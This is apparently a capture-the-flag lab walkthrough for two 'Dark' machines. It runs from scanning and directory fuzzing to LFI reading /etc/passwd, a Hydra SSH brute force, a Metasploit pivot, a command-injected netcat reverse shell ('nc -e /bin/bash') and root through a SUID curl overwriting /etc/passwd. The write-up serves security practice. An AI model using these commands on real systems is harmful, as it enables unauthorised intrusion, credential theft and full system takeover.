# Reconnaissance
## Host discovery
``` bash
sudo nmap -sn 10.10.10.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 09:53 -0300
Nmap scan report for 10.10.10.2
Host is up (0.000027s latency).
MAC Address: 22:EB:C5:60:1A:35 (Unknown)
Nmap scan report for 10.10.10.1
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.94 seconds
```
# Dark 1
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 09:55 -0300
Nmap scan report for 10.10.10.2
Host is up (0.0000030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 22:EB:C5:60:1A:35 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```
## Web enumeration
``` bash
curl -s http://10.10.10.2
<!DOCTYPE html>
<html>
<head>
    <title>darkweb</title>
</head>
<body>
    <h1>darkweb</h1>
    <form action="process.php" method="post">
        <label for="url">Ingrese una URL:</label><br>
        <input type="text" id="url" name="url"><br>
        <input type="submit" value="Enviar">
    </form>
</body>
</html>
```
### Dir fuzzing
``` bash
gobuster dir -u http://10.10.10.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt,sql,zip
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,sql,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 318]
info                 (Status: 200) [Size: 128]
process.php          (Status: 500) [Size: 0]
server-status        (Status: 403) [Size: 275]
Progress: 1245846 / 1245846 (100.00%)
===============================================================
Finished
===============================================================
```
``` bash
curl -s http://10.10.10.2/info
Toni te recuerdo que he publicado las bases de datos de telefonica,la dgt y el banco santander en mi pagina ilegal (20.20.20.3)
```
### URL input
``` bash
curl -X POST http://10.10.10.2/process.php --data "url=http://10.10.10.2"
<!DOCTYPE html>
<html>
<head>
    <title>darkweb</title>
</head>
<body>
    <h1>darkweb</h1>
    <form action="process.php" method="post">
        <label for="url">Ingrese una URL:</label><br>
        <input type="text" id="url" name="url"><br>
        <input type="submit" value="Enviar">
    </form>
</body>
</html>
```
``` bash
curl -X POST http://10.10.10.2/process.php --data "url=info"
Toni te recuerdo que he publicado las bases de datos de telefonica,la dgt y el banco santander en mi pagina ilegal (20.20.20.3)
```
``` bash
curl -X POST http://10.10.10.2/process.php --data "url=http://20.20.20.3"
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <h1>webilegal.com</h1>
    <form action="http://20.20.20.3/process.php" method="post">
        <label for="cmd">Busca un producto ilegal</label><br>
        <input type="text" id="cmd" name="cmd"><br>
        <input type="submit" value="Enviar">
    </form>
</body>
</html>
```
### LFI
``` bash
curl -X POST -s http://10.10.10.2/process.php --data "url=///////../../../etc/passwd" | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
toni:x:1000:1000:,,,:/home/toni:/bin/bash
```
### Hydra
``` bash
hydra -l toni -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2 -t 64 -F
[22][ssh] host: 10.10.10.2   login: toni   password: banana
```
# Dark 2
To pivot to this machine i'll be using *msfconsole*
Steps:
1. Get a shell with the multi/handler module
2. Upgrade the session to a meterpreter session
3. Route with the module autoroute
4. Port mapping
## Ping Sweep
``` msfconsole
msf post(multi/gather/ping_sweep) > run
[*] Performing ping sweep for IP range 20.20.20.0/24
[*] Post module execution completed
msf post(multi/gather/ping_sweep) > hosts
Hosts
=====
address     mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------     ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.2
20.20.20.3
```
## Ports scanning 
``` msfconsole
msf auxiliary(scanner/portscan/tcp) > run
[+] 20.20.20.3            - 20.20.20.3:22 - TCP OPEN
[+] 20.20.20.3            - 20.20.20.3:80 - TCP OPEN
[*] 20.20.20.3            - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
## Port mapping
``` msfconsole
meterpreter > portfwd add -l 8080 -p 80 -r 20.20.20.3
[*] Forward TCP relay created: (local) :8080 -> (remote) 20.20.20.3:80
meterpreter > portfwd add -l 2002 -p 22 -r 20.20.20.3
[*] Forward TCP relay created: (local) :2002 -> (remote) 20.20.20.3:22
```
## Web enumeration
``` bash
curl -s http://localhost:8080
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <h1>webilegal.com</h1>
    <form action="http://20.20.20.3/process.php" method="post">
        <label for="cmd">Busca un producto ilegal</label><br>
        <input type="text" id="cmd" name="cmd"><br>
        <input type="submit" value="Enviar">
    </form>
</body>
</html>
```
It is the web already seen using the URL input
## Reverse shell
Listening with the multi/handler in *msfconsole*
``` bash
curl -X POST http://localhost:8080/process.php --data "cmd=nc -e /bin/bash 20.20.20.2 4444"
```
## Privilege escalation
``` bash
find / -perm -4000 2>/dev/null
/usr/bin/curl
```
``` bash
sed 's/root:x:/root::/g' /etc/passwd > /tmp/passwd
/usr/bin/curl file:///tmp/passwd -o /etc/passwd
cat /etc/passwd | grep root
root::0:0:root:/root:/bin/bash
```
``` bash
su -
whoami
root
```
